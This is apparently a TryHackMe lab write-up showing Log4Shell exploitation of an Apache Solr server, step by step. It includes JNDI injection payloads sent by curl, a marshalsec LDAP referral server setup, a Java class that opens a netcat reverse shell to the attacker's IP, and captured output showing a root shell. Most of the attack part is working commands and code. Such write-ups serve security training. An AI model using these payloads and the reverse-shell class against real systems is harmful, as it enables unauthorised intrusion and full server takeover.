# Log4j - Exploiting a Vulnerable Apache Solar Server


### Enumerating and Analyzing target
Dashboard can seen on admin front page when navigating to the victim's web server - lots of info here.
Verify that log4j in use for logging via nmap scan (all ports) - note info on dashboard as well.
If identified as vulnerable from recon, the exploit is possible, else the rest of this report is null.

Note log directory...
```-Dsolr.log.dir```

### In logs, find an entry point 

INFO entries with repeated endpoint requests -> parameter field

### Parameter will be used as the attack vector, with payload passed as a parameter

``` ${jndi:ldap://ATTACKERADDRESS} ```

Using JNDI to allow for external resource lookup, ATTACKERADDRESS will be a listener on the kali machine.

a basic listener that will be employed
```$ nc -lnvp 4444```

## Remote Code Execution - Injection
 - Log4j processes logs by parsing entries, but may EXECUTE code in entry 
 - Any data logged is vulnerable --- we have identified one entry point from the logs earlier
  - Entry poiunt can also include forms/any source of user supplied data HTTP headers, 

Putting things together, here is an example of a maliciously crafted curl request:

```$ curl 'http://10.10.22.239:8983/solr/admin/cores?foo=$\{10.9.1.93:4444\}'```

This payload will be delivered and executed by Log4j during parsing...
```sh
┌──(kali㉿kali)-[~]
└─$ curl 'http://10.10.22.239:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.1.93:4444\}' 
{
  "responseHeader":{
    "status":0,
    "QTime":0},
  "initFailures":{},
  "status":{}}
  ```
  
Did the injection work for connnecting back to our machine??

```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444     
listening on [any] 4444 ...
connect to [10.9.1.93] from (UNKNOWN) [10.10.22.239] 50884
0
 `�

```
It worked :D but what can we do with this, what are those weird characters??? 

## Exploitation 

We can run a referral server to redirect from LDAP to another location containing our desired payload.

### Need http server to host some files on our machine that contain the good stuff (like a stage) ;)
```python python3 -m http.server```

### Need the LDAP referral server to redirect to the HTTP server where the stager resides

Ensure marshalsec is installed via ```mvn clean package -DskipTests``` after cloning the marshalsec git repository https://github.com/mbechler/marshalsec
There may be support for newer Java verisons, but marshalsec is originally developed to be used with the Java8 JDK (8u181), found at https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

Below we start up the refserver on our local system (this server waits for a connection, and then serves the redirect to whatever exploit we have)
```sh
┌──(kali㉿kali)-[/tmp/marshalsec]
└─$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.9.1.93:8000/[EXPLOITHERE].java"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
```
The refserver listens on 1389 by default (LDAP) and then forwards to 8000

Notice the .java ? Any payload going through Log2j will be executed as Java code...

## Now we have the meat of this RCE exploit: remotely executing arbitrary code of any Java file, malicious or not.

Create a .java file in your favorite IDE or text editor with the same name as [EXPLOITHERE]:

```java

public class NotSus{

	static{
		try{
			java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.9.1.93 4444"); // reverse shell connects back to us
		}
		catch(Exception e){
			;        // no unnecessary noise if anything goes wrong
		}
	}

}
```
Here is a simple reverse shell java class for the payload

Compile : ```sh $ javac NotSus.java```


# Put things together, we start setting up the delivery of a staged payload...

In separate terminals:

file server with the payload - just hosting the current directory on pt 8000
```sh
┌──(kali㉿kali)-[~/Documents]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

listen for incoming connections from the victim - keep an eye on this ;)
```sh
┌──(kali㉿kali)-[/tmp/marshalsec]
└─$ nc -lnvp 4444                
listening on [any] 4444 ...

```
rfserver that the victim will connect back to, traffic forwarded to the python file server for the Java payload
```sh
┌──(kali㉿kali)-[/tmp/marshalsec]
└─$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.9.1.93:8000/[EXPLOITHERE].java"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
```

# HELLO COMPUTER, YOU HAVE A DELIVERY!! ;)) 
### The crafted GET request to the endpoint that is logging - go ahead and send it!!!!!!
```sh
┌──(kali㉿kali)-[~]
└─$ curl 'http://10.10.22.239:8983/solr/admin/cores?pwn=$\{jndi:ldap://10.9.1.93:1389/NotSus\}' 
{
  "responseHeader":{
    "status":0,
    "QTime":0},
  "initFailures":{},
  "status":{}}
```


### nc listener - type a command and notice that we have gained full control, and can remotely do anything with our shell access
### the listener isn't the prettiest so consider sending a different payload or execute whatever java code you want

```sh
$ nc -lnvp...
listening on [any] 4444 ...
connect to [10.9.1.93] from (UNKNOWN) [10.10.22.239] 50930

whoami
solr
sudo su

whoami
root

```


## As always, from here are ways to establish persistence and C2 presence.
## Plz don't be lazy and audit your systems and commit to regular vulnerability management, this vulnerability has been disclosed for over a week now and machines EVERYWHERE are still being exploited >:(





Special thanks to John Hammond for making this simpler to understand (as always), and TryHackMe for providing the box



